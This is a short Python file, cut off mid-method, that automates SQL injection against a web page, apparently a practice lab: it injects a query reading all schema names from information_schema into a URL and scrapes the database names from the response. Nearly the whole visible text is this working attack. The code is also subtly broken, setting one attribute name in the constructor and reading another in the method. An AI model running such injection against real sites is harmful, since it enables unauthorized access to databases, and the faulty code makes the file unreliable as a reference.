# coding:utf-8


from bs4 import BeautifulSoup
import requests


class inection_database():
    def __init__(self, url):
        self.bases_url = url

    def error_injection(self):
        sqli_url = self.base_url.replace("null", "(select group_concat(schema_name) from information_schema.schemata)")
        rep = requests.get(url=sqli_url)
        result = rep.text
        html_doc = BeautifulSoup(result, "lxml")
        #    print(html_doc)
        if "Your Login name:" in result:
            for tag in html_doc.find_all(color="#99FF00"):
                print("[*]database name is: %s " % str(((tag.next).split(":", 1))[1]))

    def error_inject
